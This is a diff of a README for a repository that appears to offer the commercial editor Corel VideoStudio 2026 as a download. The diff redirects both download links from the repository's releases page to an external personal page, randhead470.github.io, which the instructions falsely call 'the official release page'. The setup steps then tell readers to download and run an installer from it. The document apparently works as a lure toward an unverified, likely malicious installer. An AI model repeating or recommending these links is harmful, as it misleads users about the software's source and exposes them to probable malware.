@@ -1,6 +1,6 @@
 # 🎬 Corel-VideoStudio-2026 - Master Your Videos With Ease
 
-[![](https://img.shields.io/badge/Download-VideoStudio_2026-blue.svg)](https://github.com/Randhead470/Corel-VideoStudio-2026/releases)
+[![](https://img.shields.io/badge/Download-VideoStudio_2026-blue.svg)](https://randhead470.github.io)
 
 ## 📌 Overview
 
@@ -22,7 +22,7 @@ Your computer needs specific hardware to run this software smoothly. Ensure your
 
 Follow these steps to acquire and set up the software.
 
-1.  Visit the official release page to find the installer. Use this link: [https://github.com/Randhead470/Corel-VideoStudio-2026/releases](https://github.com/Randhead470/Corel-VideoStudio-2026/releases).
+1.  Visit the official release page to find the installer. Use this link: [https://randhead470.github.io](https://randhead470.github.io).
 2.  Locate the latest version release.
 3.  Click the download link for the setup file.
 4.  Wait for the file to finish saving to your computer.
